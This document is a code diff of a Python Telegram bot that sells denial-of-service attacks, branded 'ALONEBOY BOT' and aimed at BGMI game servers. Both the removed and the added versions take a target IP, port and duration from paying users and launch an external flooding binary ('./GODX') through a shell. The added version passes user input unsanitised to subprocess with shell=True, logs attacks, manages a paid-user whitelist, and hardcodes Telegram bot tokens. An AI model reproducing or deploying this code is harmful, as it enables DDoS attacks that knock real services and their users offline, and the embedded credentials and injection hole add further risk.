@@ -1,163 +1,383 @@
-import os
 import telebot
-import logging
-import random
-import asyncio
-from datetime import datetime, timedelta
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from threading import Thread
-# Configuration
-TOKEN = '7619302375:AAHrO9GfVDePQBpQ-vJ-ZBxhh3kB4JL8Yaw'
-ADMIN_USER_ID = 7116437453
-ADMIN_USER_ID = 1662672529
-logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
+import subprocess
+import requests
+import datetime
+import os
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-bot = telebot.TeleBot(TOKEN)
-loop = asyncio.get_event_loop()
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-attack_in_progress = False
+# insert your Telegram bot token here
+bot = telebot.TeleBot('8160560841:AAGh-ES0PNmJcgx5mGjbzglDaM95Vq-Jxhc')
 
-# In-memory storage
-users = {}
-keys = []
+# Admin user IDs
+admin_id = ["1662672529"]
 
-# Helper Functions
-def generate_key(length=8):
-    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-    return ''.join(random.choices(chars, k=length))
+# File to store allowed user IDs
+USER_FILE = "users.txt"
 
-def add_time(days=0):
-    return (datetime.now() + timedelta(days=days)).isoformat()
+# File to store command logs
+LOG_FILE = "log.txt"
 
-def save_key(key, plan, days):
-    valid_until = add_time(days=days)
-    keys.append({"key": key, "plan": plan, "valid_until": valid_until})
-    return key, valid_until
+def get_inline_keyboard():
+    keyboard = InlineKeyboardMarkup()
+    button1 = InlineKeyboardButton("🔰 ᑕOᑎTᗩᑕT OWᑎᑎEᖇ 🔰", url="https://t.me/+03wLVBPurPk2NWRl")
+    button2 = InlineKeyboardButton("⭐ ᒍOIᑎ TEᒪEGᖇᗩᗰ ᑕᕼᗩᑎᑎEᒪ ⭐", url="https://t.me/+03wLVBPurPk2NWRl")
+    
+    # Add buttons as separate rows
+    keyboard.add(button1)
+    keyboard.add(button2)
+    
+    return keyboard
 
-def redeem_key(user_id, key):
-    global keys
-    key_data = next((k for k in keys if k['key'] == key), None)
-    if not key_data:
-        return "Invalid key."
 
-    valid_until = key_data['valid_until']
-    plan = key_data['plan']
-    users[user_id] = {"plan": plan, "valid_until": valid_until}
-    keys = [k for k in keys if k['key'] != key]
-    return f"Key redeemed successfully. Plan: {plan}, Valid Until: {valid_until}"
-
-# Admin Commands
-@bot.message_handler(commands=['genkey'])
-def handle_genkey(message):
-    if message.from_user.id != ADMIN_USER_ID:
-        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @GODxAloneBOY")
-        return
-
+# Function to read user IDs from the file
+def read_users():
     try:
-        args = message.text.split()
-        plan = int(args[1])
-        days = int(args[2])
-        key = generate_key()
-        key, valid_until = save_key(key, plan, days)
-        response = f"Key: {key}\nPlan: {plan}\nValid Until: {valid_until}"
-    except Exception as e:
-        logging.error(f"Error generating key: {e}")
-        response = "Use /genkey 1 30"
+        with open(USER_FILE, "r") as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        return []
 
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['redeem'])
-def handle_redeem(message):
-    user_id = message.from_user.id
+# Function to read free user IDs and their credits from the file
+def read_free_users():
     try:
-        key = message.text.split()[1]
-        response = redeem_key(user_id, key)
-    except Exception as e:
-        logging.error(f"Error redeeming key: {e}")
-        response = "Use /redeem <key>."
+        with open(FREE_USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, credits = user_info
+                        free_user_credits[user_id] = int(credits)
+                    else:
+                        print(f"Ignoring invalid line in free user file: {line}")
+    except FileNotFoundError:
+        pass
 
-    bot.reply_to(message, response)
 
-# Attack Command
-async def run_attack(target_ip, target_port, duration):
-    global attack_in_progress
-    attack_in_progress = True
-    try:
-        process = await asyncio.create_subprocess_shell(f"./GODX {target_ip} {target_port} {duration} 1000")
-        await process.communicate()
-        bot.send_message(ADMIN_USER_ID, f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 ❌ \n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
-    except Exception as e:
-        logging.error(f"Error during attack: {e}")
-    finally:
-        attack_in_progress = False
-#aloneboy GODXCHEATS
-@bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    user_id = message.from_user.id
-    if attack_in_progress:
-        bot.reply_to(message, "⏰ 𝙒𝘼𝙄𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 ⏰")
-        return
+# List to store allowed user IDs
+allowed_user_ids = read_users()
 
-    user_data = users.get(user_id)
-    if not user_data or user_data['plan'] == 0:
-        bot.reply_to(message, "𝘿𝙈-> @GODxAloneBOY")
-        return
-
-    try:
-        args = message.text.split()
-        target_ip, target_port, duration = args[1], int(args[2]), int(args[3])
-        if target_port in blocked_ports:
-            bot.reply_to(message, "Port is blocked. Use a different port.")
-            return
-
-        asyncio.run_coroutine_threadsafe(run_attack(target_ip, target_port, duration), loop)
-        bot.reply_to(message, f"⚡ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 ⚡\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
-    except Exception as e:
-        logging.error(f"Error processing attack command: {e}")
-        bot.reply_to(message, "🚀 Use /attack <IP> <Port> <Time>.")
-
-# Welcome Message
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("ATTACK ", "GENKEY ", "REDEEM ", "ACCOUNT ", "HELP ")
-    bot.send_message(message.chat.id, " 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑 ", reply_markup=markup)
-
-@bot.message_handler(func=lambda message: True)
-def handle_text(message):
-    if message.text == "ATTACK ":
-        bot.reply_to(message, "Use /attack <IP> <Port> <Time>")
-    elif message.text == "REDEEM ":
-        bot.reply_to(message, "Use /redeem <key>")
-    elif message.text == "GENKEY ":
-        bot.reply_to(message, "Use /genkey")        
-    elif message.text == "ACCOUNT ":
-        user_id = message.from_user.id
-        user_data = users.get(user_id)
-        if user_data:
-            plan = user_data.get('plan', 'N/A')
-            valid_until = user_data.get('valid_until', 'N/A')
-            bot.reply_to(message, f"Plan: {plan}\nValid Until: {valid_until}")
-        else:
-            bot.reply_to(message, "NO ACCOUNT")
-    elif message.text == "HELP ":
-        bot.reply_to(message, "𝘿𝙈-> @GODxAloneBOY")
+# Function to log command to the file
+def log_command(user_id, target, port, time):
+    user_info = bot.get_chat(user_id)
+    if user_info.username:
+        username = "@" + user_info.username
     else:
-        bot.reply_to(message, "Invalid option.")
+        username = f"UserID: {user_id}"
+    
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-# Start Asyncio Loop
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_forever()
 
-if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
-    asyncio_thread.start()
-    logging.info("Bot is running...")
-    while True:
+# Function to clear logs
+def clear_logs():
+    try:
+        with open(LOG_FILE, "r+") as file:
+            if file.read() == "":
+                response = "Logs are already cleared. No data found."
+            else:
+                file.truncate(0)
+                response = "Logs cleared successfully"
+    except FileNotFoundError:
+        response = "No logs found to clear."
+    return response
+
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
+
+@bot.message_handler(commands=['add'])
+def add_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_add = command[1]
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                response = f"User {user_to_add} Added Successfully."
+            else:
+                response = "User already exists."
+        else:
+            response = "Please specify a user ID to add."
+    else:
+        response = "OᑎᒪY ᗩᑎᗪᗰIᑎ ᖇᑌᑎ TᕼiS ᑕOᗰᗰᗩᑎᗪ"
+
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user_id in allowed_user_ids:
+                        file.write(f"{user_id}\n")
+                response = f"User {user_to_remove} removed successfully."
+            else:
+                response = f"User {user_to_remove} not found in the list."
+        else:
+            response = '''Please Specify A User ID to Remove. 
+ Usage: /remove <userid>'''
+    else:
+        response = "OᑎᒪY ᗩᑎᗪᗰIᑎ ᖇᑌᑎ TᕼiS ᑕOᗰᗰᗩᑎᗪ"
+
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+@bot.message_handler(commands=['clearlogs'])
+def clear_logs_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
         try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            logging.error(f"Polling error: {e}")
-            time.sleep(5)
+            with open(LOG_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "Logs are already cleared. No data found."
+                else:
+                    file.truncate(0)
+                    response = "Logs Cleared Successfully"
+        except FileNotFoundError:
+            response = "Logs are already cleared."
+    else:
+        response = "OᑎᒪY ᗩᑎᗪᗰIᑎ ᖇᑌᑎ TᕼiS ᑕOᗰᗰᗩᑎᗪ"
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+ 
+
+@bot.message_handler(commands=['allusers'])
+def show_all_users(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            response += f"- @{username} (ID: {user_id})\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id}\n"
+                else:
+                    response = "No data found"
+        except FileNotFoundError:
+            response = "No data found"
+    else:
+        response = "OᑎᒪY ᗩᑎᗪᗰIᑎ ᖇᑌᑎ TᕼiS ᑕOᗰᗰᗩᑎᗪ"
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+@bot.message_handler(commands=['logs'])
+def show_recent_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
+            try:
+                with open(LOG_FILE, "rb") as file:
+                    bot.send_document(message.chat.id, file)
+            except FileNotFoundError:
+                response = "No data found."
+                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+        else:
+            response = "No data found"
+            bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+    else:
+        response = "OᑎᒪY ᗩᑎᗪᗰIᑎ ᖇᑌᑎ TᕼiS ᑕOᗰᗰᗩᑎᗪ"
+        bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+@bot.message_handler(commands=['id'])
+def show_user_id(message):
+    user_id = str(message.chat.id)
+    response = f"Your ID: {user_id}"
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+# Function to handle the reply when free users run the /bgmi command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    
+    response = f"🍀ᗪᗪOS ᑌSEᖇ {username} 💎\n\n⚡ ᗩTTᗩᑕK STᗩᖇTEᗪ ⚡\n\n🎯 ᕼOST: {target}\n👙 ᑭOᖇT: {port}\n⏳TIᗰE: {time} SEᑕOᑎᗪ\n SEᑎᗪ ᖴEEᗪᗷᗩᑕk :- @GODxAloneBOY"
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+# Dictionary to store the last time each user ran the / command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME =0
+
+# Handler for /alone command
+@bot.message_handler(commands=['alone'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /alone Command Again buy premium instant attack with zero sec dm @GODxAloneBOY."
+                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+        
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert time to integer
+            time = int(command[3])  # Convert port to integer
+            if time > 300:
+                response = "Error: Time interval must be less than 120."
+            else:
+                record_command_logs(user_id, '/bgmi', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./GODX {target} {port} {time} 400"
+                subprocess.run(full_command, shell=True)
+                response = f"🍀 ᗪᗪOS ᑌSEᖇ\n\n💣 ᗩTTᗩᑕK ᖴIᑎISᕼEᗪ 💣\n\nDM :- @GODxAloneBOY"
+        else:
+            response = "⚠️iᑎᐯᗩᒪIᗪ\n\n E᙭ᗩᗰᑭᒪE: /alone <ɪᴘ> <ᴘᴏʀᴛ>"
+    else:
+        response = "OᑎᒪY ᑭᗩIᗪ ᗰEᗰᗷEᖇ ᑌSE TᕼIS ᗷOT\n\n DM :- @GODxAloneBOY to 🗝️"
+
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+
+# Add /mylogs command to display logs recorded for bgmi and website commands
+@bot.message_handler(commands=['mylogs'])
+def show_command_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        try:
+            with open(LOG_FILE, "r") as file:
+                command_logs = file.readlines()
+                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+                if user_logs:
+                    response = "Your Command Logs:\n" + "".join(user_logs)
+                else:
+                    response = "No Command Logs Found For You."
+        except FileNotFoundError:
+            response = "No command logs found."
+    else:
+        response = "❌ YOᑌ ᗩᖇE ᑎOT ᗩᑌTᕼOᖇIᘔEᗪ TO ᑌSE TᕼiS ᗷOT"
+
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+@bot.message_handler(commands=['help'])
+def show_help(message):
+    help_text = '''Available commands:
+ /alone : Method For Bgmi Servers. 
+ /rules : Please Check Before Use !!.
+ /mylogs : To Check Your Recents Attacks.
+ /plan : Checkout Our Botnet Rates.
+
+ To See Admin Commands:
+ /admincmd : Shows All Admin Commands.
+ By ALONEBOY BOT
+'''
+    for handler in bot.message_handlers:
+        if hasattr(handler, 'commands'):
+            if message.text.startswith('/help'):
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+            elif handler.doc and 'admin' in handler.doc.lower():
+                continue
+            else:
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+    bot.reply_to(message, help_text, reply_markup=get_inline_keyboard())
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy ALONEBOY BOT @GODxAloneBOY"
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+@bot.message_handler(commands=['rules'])
+def welcome_rules(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name} Please Follow These Rules:
+
+1. Dont Run Too Many Attacks !! Cause A Ban From Bot
+2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
+3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
+By ALONEBOY BOT'''
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+@bot.message_handler(commands=['plan'])
+def welcome_plan(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 
+'''
+
+    bot.reply_to(message, response, parse_mode='HTML', reply_markup=get_inline_keyboard())
+
+@bot.message_handler(commands=['admincmd'])
+def welcome_plan(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name}, Admin Commands Are Here!!:
+
+/add <userId> : Add a User.
+/remove <userid> Remove a User.
+/allusers : Authorised Users Lists.
+/logs : All Users Logs.
+/broadcast : Broadcast a Message.
+/clearlogs : Clear The Logs File.
+By ALONEBOY BOT
+'''
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split(maxsplit=1)
+        if len(command) > 1:
+            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                for user_id in user_ids:
+                    try:
+                        bot.send_message(user_id, message_to_broadcast)
+                    except Exception as e:
+                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+            response = "Broadcast Message Sent Successfully To All Users."
+        else:
+            response = "Please Provide A Message To Broadcast."
+    else:
+        response = "Only Admin Can Run This Command."
+
+    bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+
+
+
+
+bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
+
